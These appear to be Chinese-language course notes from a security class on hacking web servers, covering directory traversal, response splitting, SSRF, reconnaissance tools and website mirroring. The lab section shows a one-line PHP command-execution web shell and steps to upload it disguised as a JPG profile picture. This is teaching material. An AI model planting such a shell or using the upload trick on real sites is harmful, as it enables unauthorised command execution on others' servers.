{%hackmd @themes/notion %}

###### tags: `資訊安全`

# CH13-Hacking Web Servers
| 事項         | 時間                             |
| ------------ | -------------------------------- |
| 上課日期     | 2022/05/29(日) 09:00 ~ 18:00     |
| 最後更新日期 | 2022/07/31(日) 01:35             |
| 編輯人       | @pocper1、@2CwPgtM-RUuet4CyKo4Xmw |

## 文章
### 目錄
[TOC]

### 概要
> 學習如何入侵網路伺服器
---

## Web Server Concepts
> To understand web server hacking, it is essential to understand web server concepts, including what a web server is, how it functions, and other elements associated with it.
This section provides a brief overview of a web server and its architecture. It will also explain common factors or mistakes that allow attackers to hack a web server. This section also describes the impact of attacks on web servers. 

## LAB 
###  Directory Traversal Attacks
> 目的：路徑跨越+任意檔案插入可以做到
> 原因: 封包過濾式防火牆只能保護作業系統

![](https://i.imgur.com/FiZatHC.png)

1.  將php寫入以下程式碼
    ```php=
    # [可參考這個網站](https://progressbar.tw/posts/168)
    <?php 
        System($GET_["1"]); # 這樣就會取得變數是1的參數
    ?>
    ```
2. 將以上的附檔名改為"jpg"，並且上傳到大頭照專區

3. 透過網站路徑去找到上傳的大頭照
   ![](https://i.imgur.com/uonSARO.png)


- 工具:zone-h，[zone-h](http://www.zone-h.org/)
    > 目的：看別人網站被hack

## Web Server Attacks
### HTTP Response-Splitting Attack
> An HTTP response-splitting attack is a web-based attack in which the attacker tricks the server by injecting new lines into response headers, along with arbitrary code.

> 目的：在http request注入\r\n
> 從一篇切割成兩篇

### Server-Side Request Forgery(SSRF) Attack
:::danger
考試會考
:::
![](https://i.imgur.com/odYSpVG.png =70%x)
> Attackers exploit server-side request forgery (SSRF) vulnerabilities, which evolve from the unsafe use of functions in an application, in public web servers to send crafted requests to the internal or backend servers.

> 目的：server假造請求
> 利用假造過後的請求綁架中介server端的元件去攻擊內部server
### Web Application Attack

## Web Server Attack Methodology
1. information gathering
2. web Server Footprinting
3. Website Mirroring
4. Vulnerability Scanning
5. Session Hijacking
6. Web Server Passwords Hacking


### Information gathering 
> 可以從 Robots.txt 檔案找到
> 目的：叫爬蟲網站不要爬這些網頁
> 此地無銀三百兩，告訴別人有這個網站且重要
#### 工具
- **WHOis**，[WHOis](https://www.whois.net) 
- Whois Lookup (https://whois.domaintools.com)
- Whois (https://www.whois.com) 
- DNSstuff WHOIS/IPWHOIS Lookup (https://tools.dnsstuff.com) 
- Domain Dossier (https://centralops.net) 
- Find Subdomains (https://pentest-tools.com)

### Website Mirroring
> Website mirroring copies an entire website and its content onto a local drive. The mirrored website reveals the complete profile of the site’s directory structure, file structure, external links, images, web pages, and so on. With a mirrored target website, an attacker can easily map the website’s directories and gain valuable information. 

> 複製一份
> 目的: 看source code
- web弱掃工具 nstalker

## CH13 Practice
2. [Lab1-6] Enumerate Web Server Information using Nmap Scripting Engine (NSE)
3. [Lab2-1] Crack FTP Credentials using a Dictionary Attack